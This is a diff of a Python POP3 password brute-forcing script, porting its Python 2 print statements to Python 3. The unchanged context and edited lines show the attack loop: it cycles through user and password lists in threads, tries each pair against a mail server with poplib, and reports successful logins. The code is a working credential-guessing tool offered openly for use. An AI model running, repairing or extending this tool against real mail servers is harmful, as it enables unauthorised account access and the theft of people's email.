@@ -29,19 +29,14 @@ def Start(server, userlist, wordlist):
     except (poplib.error_proto):
         welcome = "No Response"
         pass
-    print
-    "[+] Server:", server
-    print
-    "[+] Users Loaded:", len(users)
-    print
-    "[+] Words Loaded:", len(words)
-    print
-    "[+] Server response:", welcome, "\n"
+    print("[+] Server:", server)
+    print("[+] Users Loaded:", len(users))
+    print("[+] Words Loaded:", len(words))
+    print("[+] Server response:", welcome, "\n")
+
 
     wordlist = copy(words)
-
-    def sattack():
-        attack()
+    var = lambda: attack()
 
     def reloader():
         for word in wordlist:
@@ -55,8 +50,7 @@ def Start(server, userlist, wordlist):
             words.remove(value[0])
 
         else:
-            print
-            "Reloading Wordlist - Changing User\n"
+            print("Reloading Wordlist - Changing User\n")
             reloader()
             value = random.sample(words, 1)
             users.remove(users[0])
@@ -68,16 +62,12 @@ def Start(server, userlist, wordlist):
         def run(self):
             value, user = getword()
             try:
-                print
-                "-" * 12
-                print
-                "User:", user, "Password:", value
+                print("-" * 12)
+                print("User:", user, "Password:", value)
                 pop = poplib.POP3(sys.argv[1])
                 pop.user(user)
                 pop.pass_(value)
-                print
-                "\t\nLogin successful:", value, user
-                print
+                print("\t\nLogin successful:", value, user)
                 pop.stat()
                 pop.quit()
                 work.join()
